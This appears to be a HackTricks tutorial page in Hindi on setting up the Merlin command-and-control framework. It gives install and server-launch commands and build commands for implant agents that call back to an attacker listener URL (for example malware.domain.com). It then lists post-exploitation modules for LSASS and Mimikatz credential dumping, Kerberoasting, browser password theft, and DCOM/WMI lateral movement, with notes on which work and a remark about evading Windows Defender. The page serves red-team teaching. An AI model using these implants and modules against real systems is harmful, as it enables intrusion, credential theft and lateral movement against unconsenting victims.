<details>

<summary><strong>AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग प्राप्त करें**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** 🐦 पर मुझे **फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके अपनी हैकिंग ट्रिक्स शेयर करें।

</details>


# स्थापना

## GO स्थापित करें
```
#Download GO package from: https://golang.org/dl/
#Decompress the packe using:
tar -C /usr/local -xzf go$VERSION.$OS-$ARCH.tar.gz

#Change /etc/profile
Add ":/usr/local/go/bin" to PATH
Add "export GOPATH=$HOME/go"
Add "export GOBIN=$GOPATH/bin"

source /etc/profile
```
## मर्लिन इंस्टॉल करें
```
go get https://github.com/Ne0nd0g/merlin/tree/dev #It is recommended to use the developer branch
cd $GOPATH/src/github.com/Ne0nd0g/merlin/
```
# मर्लिन सर्वर लॉन्च करें
```
go run cmd/merlinserver/main.go -i
```
# मर्लिन एजेंट्स

आप [पूर्व-संकलित एजेंट्स डाउनलोड कर सकते हैं](https://github.com/Ne0nd0g/merlin/releases)

## एजेंट्स संकलित करें

मुख्य फोल्डर _$GOPATH/src/github.com/Ne0nd0g/merlin/_ पर जाएं
```
#User URL param to set the listener URL
make #Server and Agents of all
make windows #Server and Agents for Windows
make windows-agent URL=https://malware.domain.com:443/ #Agent for windows (arm, dll, linux, darwin, javascript, mips)
```
## **मैनुअल कंपाइल एजेंट्स**
```
GOOS=windows GOARCH=amd64 go build -ldflags "-X main.url=https://10.2.0.5:443" -o agent.exe main.g
```
# मॉड्यूल्स

**बुरी खबर यह है कि Merlin द्वारा प्रयुक्त हर मॉड्यूल स्रोत (Github) से डाउनलोड किया जाता है और उपयोग से पहले डिस्क पर सेव किया जाता है। जब आप प्रसिद्ध मॉड्यूल्स का उपयोग कर रहे हों तो सावधान रहें क्योंकि Windows Defender आपको पकड़ लेगा!**

**SafetyKatz** --> Modified Mimikatz. LSASS को फाइल में डंप करें और उस फाइल के लिए:sekurlsa::logonpasswords लॉन्च करें\
**SharpDump** --> निर्दिष्ट प्रोसेस ID के लिए minidump (LSASS डिफ़ॉल्ट रूप से) (यह कहा जाता है कि अंतिम फाइल का एक्सटेंशन .gz है लेकिन वास्तव में यह .bin है, लेकिन यह एक gz फाइल है)\
**SharpRoast** --> Kerberoast (काम नहीं करता)\
**SeatBelt** --> CS में स्थानीय सुरक्षा परीक्षण (काम नहीं करता) https://github.com/GhostPack/Seatbelt/blob/master/Seatbelt/Program.cs\
**Compiler-CSharp** --> csc.exe /unsafe का उपयोग करके कंपाइल करें\
**Sharp-Up** --> C# में powerup में सभी जांचें (काम करता है)\
**Inveigh** --> PowerShellADIDNS/LLMNR/mDNS/NBNS स्पूफर और मैन-इन-द-मिडल टूल (काम नहीं करता, लोड करने की आवश्यकता है: https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1)\
**Invoke-InternalMonologue** --> सभी उपलब्ध उपयोगकर्ताओं का अनुकरण करता है और प्रत्येक के लिए एक चुनौती-प्रतिक्रिया प्राप्त करता है (प्रत्येक उपयोगकर्ता के लिए NTLM हैश) (खराब url)\
**Invoke-PowerThIEf** --> IExplorer से फॉर्म्स चुराएं या उसे JS निष्पादित करने के लिए बनाएं या उस प्रक्रिया में एक DLL इंजेक्ट करें (काम नहीं करता) (और PS भी काम नहीं करता लगता है) https://github.com/nettitude/Invoke-PowerThIEf/blob/master/Invoke-PowerThIEf.ps1\
**LaZagneForensic** --> ब्राउज़र पासवर्ड प्राप्त करें (काम करता है लेकिन आउटपुट डायरेक्टरी प्रिंट नहीं करता)\
**dumpCredStore** --> Win32 Credential Manager API (https://github.com/zetlen/clortho/blob/master/CredMan.ps1) https://www.digitalcitizen.life/credential-manager-where-windows-stores-passwords-other-login-details\
**Get-InjectedThread** --> चल रही प्रक्रियाओं में क्लासिक इंजेक्शन का पता लगाएं (क्लासिक इंजेक्शन (OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread)) (काम नहीं करता)\
**Get-OSTokenInformation** --> चल रही प्रक्रियाओं और थ्रेड्स की टोकन जानकारी प्राप्त करें (उपयोगकर्ता, समूह, विशेषाधिकार, मालिक… https://docs.microsoft.com/es-es/windows/desktop/api/winnt/ne-winnt-\_token_information_class)\
**Invoke-DCOM** --> DCOM के माध्यम से एक कमांड निष्पादित करें (अन्य कंप्यूटर में) (http://www.enigma0x3.net.) (https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/)\
**Invoke-DCOMPowerPointPivot** --> PowerPoint COM ऑब्जेक्ट्स का दुरुपयोग करके अन्य PC में एक कमांड निष्पादित करें (ADDin)\
**Invoke-ExcelMacroPivot** --> DCOM का दुरुपयोग करके Excel में अन्य PC में एक कमांड निष्पादित करें\
**Find-ComputersWithRemoteAccessPolicies** --> (काम नहीं करता) (https://labs.mwrinfosecurity.com/blog/enumerating-remote-access-policies-through-gpo/)\
**Grouper** --> यह समूह नीति के सभी सबसे दिलचस्प भागों को डंप करता है और फिर उनमें शोषणीय सामग्री के लिए खोज करता है। (पुराना) Grouper2 पर एक नज़र डालें, वास्तव में अच्छा लगता है\
**Invoke-WMILM** --> बाद में चलने के लिए WMI\
**Get-GPPPassword** --> groups.xml, scheduledtasks.xml, services.xml और datasources.xml के लिए देखें और प्लेनटेक्स्ट पासवर्ड लौटाएं (डोमेन के अंदर)\
**Invoke-Mimikatz** --> Mimikatz का उपयोग करें (डिफ़ॉल्ट डंप क्रेड्स)\
**PowerUp** --> https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc\
**Find-BadPrivilege** --> कंप्यूटरों में उपयोगकर्ताओं के विशेषाधिकारों की जांच करें\
**Find-PotentiallyCrackableAccounts** --> SPN से जुड़े उपयोगकर्ता खातों के बारे में जानकारी प्राप्त करें (Kerberoasting)\
**psgetsystem** --> getsystem

**स्थायित्व मॉड्यूल्स की जांच नहीं की**

# सारांश

मुझे इस टूल की अनुभूति और संभावना बहुत पसंद है।\
मुझे आशा है कि यह टूल सर्वर से मॉड्यूल्स डाउनलोड करना शुरू कर देगा और स्क्रिप्ट्स डाउनलोड करते समय किसी प्रकार की चकमा देने की क्षमता को एकीकृत करेगा।


<details>

<summary><strong>AWS हैकिंग सीखें शून्य से नायक तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं या **HackTricks को PDF में डाउनलोड** करना चाहते हैं तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एक्सक्लूसिव [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) या **Twitter** पर मुझे 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)** का अनुसरण करें।**
* **HackTricks** को अपनी हैकिंग ट्रिक्स साझा करके PRs सबमिट करें** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
